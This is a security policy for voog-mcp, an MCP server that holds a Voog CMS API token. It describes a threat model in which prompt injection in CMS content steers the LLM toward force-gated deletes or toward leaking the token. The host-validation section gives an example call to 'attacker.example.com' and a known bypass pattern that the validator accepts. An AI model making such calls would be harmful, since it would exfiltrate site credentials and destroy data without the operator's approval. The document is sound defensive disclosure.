# Security Policy

This document describes the security model, operator responsibilities,
and reporting procedure for voog-mcp.

## Threat model

voog-mcp is a CLI and an MCP server that holds a Voog API token and
mediates requests between an LLM (untrusted reasoning agent) and the
Voog Admin / Ecommerce API. The threat model has three actors:

- **Operator** (trusted) — the person who installs voog-mcp, drops a
  `voog.json`, and runs `voog-mcp` as an MCP server inside their LLM
  host (Claude Desktop, Claude Code, etc.).
- **LLM** (semi-trusted) — drives tool calls based on operator prompts
  AND any content the operator feeds it (file contents, web pages,
  search results). Treated as a potentially adversarial input channel:
  prompt-injection in CMS content can steer the LLM toward destructive
  tool calls.
- **Voog API** (semi-trusted) — the upstream service. Treated as
  honest-but-buggy: the upload-URL validator (`_validate_upload_url`)
  exists because a compromised or misconfigured Voog response could
  redirect file PUTs at internal addresses or look-alike hosts.

**The Voog API token is the primary asset.** It is site-scoped (a
single token grants full read/write on one site) but NOT scoped to
individual resources — anyone holding it can read every page, every
product, every order, every form submission on the site. Treat it as
equivalent to the admin password for that site.

## Required MCP host configuration

voog-mcp emits `destructiveHint: true` on every tool that can delete,
overwrite, or otherwise alter persistent state in a way the operator
cannot easily undo. The MCP host MUST be configured so that
**every `destructiveHint: true` call requires explicit human
approval** before execution. This is the load-bearing safety property
for force-gated deletes: without it, an LLM can call `page_delete(...,
force=true)` from a prompt-injection payload and the page is gone.

Concretely, in Claude Code / Claude Desktop this means leaving the
default "approve each tool call" UX in place. Do NOT enable
auto-approve for voog-mcp tools.

## Force-gate semantics — what `force=true` does and does NOT prove

Destructive voog-mcp tools (`page_delete`, `article_delete`,
`product_delete`, `webhook_delete`, `language_delete`,
`tag_delete`, `comment_delete`, …) reject calls that lack `force=true`
on the arguments. This is intended as a friction layer, not as a
proof of human consent:

- **The LLM controls the `force=true` argument.** If an LLM decides
  to delete a page, it can pass `force=true` itself — voog-mcp will
  not stop it. The argument is a documentation cue ("the model is
  asserting deliberate intent") and a regression guard against
  accidental dispatch under unclear instructions, not a security
  boundary.
- **The actual security boundary is the MCP host's tool-call approval
  UI** — i.e. the human clicking "Allow" when the host surfaces a
  `destructiveHint: true` call. The force-gate exists so the LLM has
  to articulate its destructive intent in the argument shape, which
  the human can read in the approval prompt before approving.

If your MCP host does not surface destructive-hint approvals to a
human, voog-mcp's force-gate provides NO meaningful protection.

### Special case: `include_pii` on `orders_list` / `order_get`

The `include_pii` gate uses `destructiveHint=True` alongside
`readOnlyHint=True`. Per the MCP spec, `destructiveHint` is "only
meaningful when `readOnlyHint=false`" — so spec-strict hosts will
treat these tools as read-only and skip the destructive-action
prompt. The handler-side `force=true` gate is the load-bearing
defense in this case: it forces the LLM to articulate PII access in
the tool-call args (`include_pii=true, force=true`), which the
operator sees verbatim in the host's tool-call approval UI
regardless of how the host renders destructive-hint UX. The dual-
annotation choice is documented inline in
[`src/voog/mcp/tools/orders.py`](src/voog/mcp/tools/orders.py) so future
contributors don't "fix" the apparent contradiction by dropping
`destructiveHint`.

## Token rotation

Rotate the Voog API token at least every 6 months, and immediately on
any of:

- Operator's machine compromise / loss
- Suspected leak (token appeared in a transcript log, a paste buffer,
  a screenshot, etc.)
- Departure of a person who had read access to the operator's machine

Procedure:

1. Open the Voog admin UI for the site.
2. Settings → API Keys (or equivalent — Voog's UI labels evolve).
3. Revoke the current API key.
4. Issue a new API key. Copy the value once — Voog does not show it
   again.
5. Update `voog.json` (the `api_key` field if inline, or the
   environment variable referenced by `api_key_env`).
6. Restart any running `voog-mcp` server processes — tokens are
   cached on the `VoogClient` for the process lifetime.
7. Run `voog --site <name> site-snapshot --overwrite ./tmp-rotation-check`
   as a smoke test to confirm the new token works.

If you use `api_key_env` (recommended) with a `.env` file, also
verify the `.env` is in `.gitignore` and was never committed.

## `voog_list_my_sites` token-exposure note

The `voog_list_my_sites` MCP tool (Phase 3 S6) accepts a Voog API
token to enumerate sites the token has access to. Two argument
shapes are supported:

- **`token_env: "<ENV_VAR_NAME>"` — preferred.** The MCP boundary
  reads `os.environ[<name>]`; the token never flows through the tool
  argument and therefore never enters the LLM context or the
  transcript log.
- **`token: "<literal>"` — ad-hoc fallback only.** The token IS
  visible to the LLM and WILL appear in any host-side transcript log.
  Use only for one-off operator-driven calls; never embed in a
  Claude Project's system prompt or a saved skill.

Voog API tokens are site-scoped: a single token returns metadata
for exactly one site. To enumerate multiple sites, the operator
supplies each site's token separately (each invocation is
independent — there is no user-wide site listing endpoint).

**Host SSRF defense.** The `host` argument to `voog_list_my_sites`
(and to the `voog list-my-sites` CLI subcommand, and the
`voog config init --bootstrap-from-token` interactive probe) is
validated against an SSRF-defensive ruleset
(`voog._security.validate_host`). Rejected: raw IPv4 / IPv6 addresses
(including the AWS metadata IP 169.254.169.254), loopback, RFC1918
private ranges, private TLDs (`.local`, `.internal`, `.onion`, `.test`,
…), RFC 2606 reserved second-level domains (`example.com`, etc.),
IDN homographs, and hosts longer than RFC 1035's 253-octet cap. This
is the load-bearing defense against the prompt-injection variant
where an LLM is steered to call
`voog_list_my_sites(host="attacker.example.com", token_env="VOOG_API_KEY")`
— without it, the operator's full-admin Voog token would ship as
`X-API-Token` to a third party. The validator is intentionally NOT a
`*.voog.com` allowlist — tenants legitimately host the admin API on
their own primary domain (e.g. `stellasoomlais.com`), so a domain
allowlist would reject real-world setups.

**Known limitation: apex-prefix attacker pattern.** Because the
validator deliberately accepts arbitrary primary domains, hostnames
shaped like `voog.com.attacker.com` slip through — the `.attacker.com`
suffix doesn't match any private-TLD denylist and the `voog.com.` apex
is just a label of a third-party domain, not the Voog apex. This is
the same trade-off that makes Stella's `stellasoomlais.com` work: any
suffix-based "looks like Voog" allowlist would either false-positive
on `voog.com.attacker.com` AND `notvoog.com` and `voog.commerce.example.com`,
or false-negative on legitimate primary-domain tenants. We chose the
permissive direction.

Operator-facing mitigation: prefer `token_env=` over `token=` so the
prompt-injection variant can't smuggle a fresh token; the
`token_env=VOOG_API_KEY` form only re-uses the operator's existing
shell environment, which is bounded by the configured site set. The
SSRF validator covers the more dangerous shapes (loopback, IPv4,
metadata IP, private TLDs); the apex-prefix gap is the residual
cost of avoiding a domain allowlist.

## Logging

voog-mcp's own DEBUG output is PII-redacted: `voog.client._request`
runs header dicts through `_redact_headers` and caps query-string
values at 50 characters before any `logger.debug(...)` call
(Phase 6a S-1).

That redaction layer does NOT cover the transport stack below
voog-mcp. `httpx[http2]` pulls in `httpcore` and `hpack`, both of which
emit raw HTTP/2 frames at DEBUG — including the HPACK-encoded
`x-api-token` header. A v1.4 smoke test confirmed that calling
`logging.basicConfig(level=DEBUG)` from a user script was enough to
land the bearer token in plaintext in the conversation transcript.

To prevent this, both entry points (`voog-mcp` MCP server and the
`voog` CLI) call `voog.logging.silence_transport_loggers()` during
startup. The helper clamps `httpcore`, `httpcore.connection`,
`httpcore.http11`, `httpcore.http2`, `httpx`, `hpack`, `hpack.hpack`,
and `hpack.table` to `WARNING`, which is below their token-emitting
DEBUG level.

**Operator responsibility.** If you re-enable transport DEBUG after
voog-mcp starts (e.g. by calling
`logging.getLogger("httpcore").setLevel(logging.DEBUG)` from a debug
shim, or by importing third-party tooling that does so), you MUST
accept that authentication tokens will appear in plaintext in any log
sink that captures stderr. The `voog` logger itself is NOT clamped —
voog-mcp's own DEBUG output is safe to leave on.

## Reporting a vulnerability

Email security reports to: **runnel@gmail.com**

Please include:

- A description of the vulnerability and its impact
- Steps to reproduce, if known
- Any draft mitigation you have in mind

Initial acknowledgement within 7 days; coordinated-disclosure
window 90 days from acknowledgement unless mutually agreed otherwise.
For non-sensitive issues, a GitHub issue at
https://github.com/runnel/voog-mcp/issues is also fine.
